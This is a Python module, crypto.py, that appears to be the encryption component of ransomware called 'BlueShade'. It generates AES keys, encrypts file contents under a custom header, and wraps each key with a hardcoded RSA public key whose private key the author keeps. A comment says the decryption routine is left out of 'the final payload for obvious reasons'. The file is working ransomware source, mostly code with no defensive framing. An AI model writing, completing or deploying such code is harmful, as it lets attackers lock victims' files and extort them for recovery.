#!/usr/bin/env python3
# crypto.py - Encryption/decryption functionality for BlueShade
# Handles key generation, file encryption, and secure key storage
# Using hybrid crypto - RSA for key protection, AES for file encryption

import os
import base64
import struct
import random
from io import BytesIO
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization

# Our hardcoded public key for key encryption
# Private key is stored safely and never included in the code
PUBLIC_KEY_PEM = """
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvXEbJ5A8ZX1UImDZXIyJ
tPMZ8Ob3KU4epDZQFH8CprDoTQZC1jQfQKP8j1TUy33AAk0bjgKzojfQkGFJUPZF
VpLR9FO03vMIFyCgvWm0da2K2h4NXzxB8rWmfOZHW1nKBmyJqPzJ7MhB8A9ZNyJK
x0EXmLVRWZyEIuWdIgVbVPuRJxwqFHHrHCVqYYCKYgQIjlcbULj1zJSP3zYXOnPA
Ew8I9QEkUbbaA2fd5euTjRx8thO+Vcc6QL8p7CQDcb1uyBWFDKQMbX5rGLj2jYVN
OB8aoCzX7qk4+QJR6Jly7Q5aVJTzY/qM1H0lDVVYU2JUWaRO6BQEd5GU0FQBvpIx
DQIDAQAB
-----END PUBLIC KEY-----
""".strip()

# File encryption header
FILE_HEADER = b"BLUESHADE01"  # Version 1 header

def generate_key():
    """Generate a random 256-bit AES key"""
    return os.urandom(32)  # 32 bytes = 256 bits

def encrypt_key_with_public(aes_key):
    """Encrypt our AES key with the public RSA key"""
    try:
        # Load the public key
        public_key = serialization.load_pem_public_key(
            PUBLIC_KEY_PEM.encode(),
            backend=default_backend()
        )
        
        # Encrypt the AES key with RSA
        encrypted_key = public_key.encrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        
        return encrypted_key
    except Exception as e:
        print(f"Key encryption error: {e}")
        return None

def encrypt_file_data(file_data, key):
    """Encrypt file content with the AES key"""
    try:
        # Generate random IV
        iv = os.urandom(16)
        
        # Create AES cipher with CBC mode
        cipher = Cipher(
            algorithms.AES(key),
            modes.CBC(iv),
            backend=default_backend()
        )
        encryptor = cipher.encryptor()
        
        # Pad the file data to block size (16 bytes)
        padding_len = 16 - (len(file_data) % 16)
        padded_data = file_data + bytes([padding_len]) * padding_len
        
        # Encrypt the padded data
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
        
        # Prepare output buffer
        output = BytesIO()
        
        # Write header and metadata
        output.write(FILE_HEADER)  # Magic header
        output.write(iv)  # IV for decryption
        
        # Write file size (8 bytes, little endian)
        output.write(struct.pack("<Q", len(file_data)))
        
        # Write encrypted data
        output.write(encrypted_data)
        
        return output.getvalue()
    except Exception as e:
        print(f"File encryption error: {e}")
        return None

def decrypt_file_data(encrypted_data, key):
    """
    Decrypt file - NOTE: This function is kept here for testing
    but is not included in the final payload for obvious reasons
    """
    try:
        # Read header
        buffer = BytesIO(encrypted_data)
        header = buffer.read(len(FILE_HEADER))
        
        if header != FILE_HEADER:
            print("Invalid file header")
            return None
        
        # Read IV
        iv = buffer.read(16)
        
        # Read original file size
        orig_size_bytes = buffer.read(8)
        orig_size = struct.unpack("<Q", orig_size_bytes)[0]
        
        # Read encrypted data
        encrypted_content = buffer.read()
        
        # Create AES cipher for decryption
        cipher = Cipher(
            algorithms.AES(key),
            modes.CBC(iv),
            backend=default_backend()
        )
        decryptor = cipher.decryptor()
        
        # Decrypt the data
        decrypted_padded = decryptor.update(encrypted_content) + decryptor.finalize()
        
        # Remove padding
        decrypted_data = decrypted_padded[:orig_size]
        
        return decrypted_data
    except Exception as e:
        print(f"File decryption error: {e}")
        return None

# For testing encryption/decryption functionality
def test_crypto():
    """Test encryption/decryption - for development only"""
    test_data = b"This is a test file that will be encrypted and then decrypted."
    
    # Generate key
    key = generate_key()
    print(f"Generated key: {base64.b64encode(key).decode()}")
    
    # Encrypt data
    encrypted = encrypt_file_data(test_data, key)
    if not encrypted:
        print("Encryption failed")
        return
    
    print(f"Encrypted data length: {len(encrypted)} bytes")
    
    # Test RSA key encryption
    encrypted_key = encrypt_key_with_public(key)
    if not encrypted_key:
        print("Key encryption failed")
        return
    
    print(f"Encrypted key length: {len(encrypted_key)} bytes")
    
    # Decrypt data
    decrypted = decrypt_file_data(encrypted, key)
    if not decrypted:
        print("Decryption failed")
        return
    
    print(f"Decrypted: {decrypted.decode()}")
    print(f"Success: {decrypted == test_data}")

if __name__ == "__main__":
    # Don't run this directly in production, just for testing
    test_crypto()
